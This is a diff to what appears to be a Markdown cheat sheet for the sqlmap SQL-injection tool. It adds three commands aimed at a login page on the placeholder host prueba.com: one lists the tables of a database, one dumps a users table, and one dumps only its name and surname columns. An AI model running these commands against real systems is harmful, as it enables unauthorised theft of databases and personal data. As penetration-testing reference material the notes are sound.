@@ -42,6 +42,24 @@ sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&passwor
 ```
 
 <br>
+
+
+```
+sqlmap -u "http://prueba.com/info.php?action=login" --tables -D testdb
+```
+> View tables
+
+```
+sqlmap -u "http://prueba.com/info.php?action=login" -D testdb -T users --dump
+```
+> Dumping table users
+
+```
+sqlmap -u "http://prueba.com/info.php?action=login" -D testdb -T users -C name,surname --dump
+```
+>Dumping table users columns name and surname
+
+<br>
 <br>
 <br>
 <br>
